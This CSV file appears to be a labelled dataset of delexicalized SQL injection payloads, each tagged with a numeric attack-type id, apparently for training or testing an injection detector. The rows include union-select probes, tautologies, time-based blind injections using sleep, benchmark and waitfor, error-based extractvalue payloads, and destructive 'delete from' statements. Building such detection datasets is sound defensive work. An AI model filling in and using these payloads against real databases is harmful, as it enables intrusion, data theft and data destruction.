payload_delex,type_id
-__INT__ % __STR__ % __STR__,2
"__INT__"" ) union all select null , null , null , null , null , null , null#",7
-__INT__' ) ) ) or __INT__ = __INT__#,2
"-__INT__ ) ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
"__INT__' ) __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) #",3
"__INT__"" or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null )",2
__INT__' ) order by __INT__#,0
-__INT__' or __INT__ = __INT__,2
"__INT__ where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
__INT__ % ) ) rlike sleep ( __INT__ ) and ( ( % __STR__,6
"__INT__"" where __INT__ = __INT__ __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) --",3
"-__INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
"__INT__"" and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
__INT__ ) ) or sleep ( __INT__ ) and ( ( __IDENT__,6
delete from __IDENT__ where __IDENT__ = __STR__ ;,2
-3501__STR__jnnc__STR__jnnc,2
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ union all select null , null , null#",7
1__STR__diai__STR__diai,2
"__INT__ % ' ) ) ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
__INT__' and sleep ( __INT__ ) #,6
"-__INT__"" ) as __IDENT__ where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",2
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
1__STR__gvoh__STR__gvoh,2
"__INT__' ) where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
-4980__STR__mnlj__STR__mnlj,2
"__INT__ ) ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( ( __IDENT__",6
union select * from __IDENT__ where __IDENT__ = char ...,7
__INT__ ) as __IDENT__ where __INT__ = __INT__ and ( __INT__ = __INT__ ) * __INT__ --,2
"__INT__"" ) or sleep ( __INT__ ) #",6
delete from __IDENT__,2
"__INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
__INT__ ) waitfor __IDENT__ __STR__ and ( __INT__ = __INT__,6
__INT__ ) and __INT__ = __INT__ and ( __INT__ = __INT__,2
"__INT__ % ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( % __STR__",2
"__INT__ ) ) __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) and ( ( __IDENT__",3
"__INT__ % "" ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ ) where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) --",6
"-__INT__ ) ) as __IDENT__ where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
-__INT__' ) or __INT__ = __INT__ --,2
"__INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and __IDENT__",6
"-__INT__"" ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
( __INT__ = __INT__ and sleep ( __INT__ ) ),6
"__INT__' , ( __IDENT__ if ( __INT__ = __INT__ ) then dbms_lock . sleep ( __INT__ )",6
-__INT__' ) or __INT__ = __INT__,2
"-__INT__"" where __INT__ = __INT__ or __INT__ = __INT__ --",2
